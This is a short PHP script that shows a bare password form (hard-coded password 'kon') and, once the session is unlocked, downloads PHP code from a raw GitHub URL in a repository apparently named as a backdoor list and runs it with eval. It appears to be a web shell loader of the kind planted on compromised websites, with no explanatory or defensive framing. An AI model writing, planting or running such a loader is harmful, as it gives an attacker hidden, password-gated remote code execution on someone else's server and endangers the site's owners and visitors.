<?php
session_start();

if(isset($_POST['pass']) && $_POST['pass'] === 'kon') {
    $_SESSION['authenticated'] = true;
}

if(!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    echo "
    <!DOCTYPE html>
    <html lang=\"en\">

    <head>
        <meta charset=\"UTF-8\">
        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">
        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
        <style>
            body {
                font-family: monospace;
            }

            input[type=\"password\"] {
                border: none;
                border-bottom: 1px solid black;
                padding: 2px;
            }

            input[type=\"password\"]:focus {
                outline: none;
            }

            input[type=\"submit\"] {
                border: none;
                padding: 4.5px 20px;
                background-color: #2e313d;
                color: #FFF;
            }
        </style>
    </head>

    <body>
        <form action=\"\" method=\"post\">
            <div align=\"center\">
                <input type=\"password\" name=\"pass\" placeholder=\"&nbsp;Password\">&nbsp;<input type=\"submit\" name=\"submit\" value=\">\">
            </div>
        </form>
    </body>

    </html>";
    exit;
}

$url = 'https://raw.githubusercontent.com/sibueeee/listbekdur/refs/heads/main/index2.php';
$kode = file_get_contents($url);
if ($kode === FALSE) {
    die('Error fetching code from URL.');
}
eval('?>' . $kode);
?>